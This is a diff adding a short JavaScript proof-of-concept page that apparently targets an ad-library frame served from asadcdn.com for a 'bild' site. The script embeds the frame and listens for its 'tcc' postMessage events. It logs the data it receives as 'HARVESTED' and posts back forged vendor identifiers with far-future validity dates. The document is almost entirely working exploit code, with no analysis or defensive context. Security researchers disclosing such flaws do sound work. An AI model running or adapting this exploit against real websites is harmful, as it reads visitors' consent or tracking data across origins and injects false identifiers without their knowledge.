@@ -1,0 +1,15 @@
+<script>
+const SRC = "https://www.asadcdn.com/adlib/libmodules/extensions/almwg.5e27ab71.html"
+          + "?ref=" + encodeURIComponent(location.origin) + "&branch=poc&tsn=1&siteName=bild";
+window.addEventListener('message', e => {
+  if (!e.data || e.data.message !== 'tcc') return;
+  console.log("HARVESTED", e.data.data);                 // read
+  e.source.postMessage({                                  // write
+    vendors: ["mi"],
+    data: { mi: { ids:{heidi:"XK-INJECTED-ID-12345"},
+                  craftDates:{heidi:Date.now()},
+                  validDates:{heidi:4102444800000} } }
+  }, "https://www.asadcdn.com");
+});
+const f = document.createElement('iframe'); f.src = SRC; document.body.appendChild(f);
+</script>
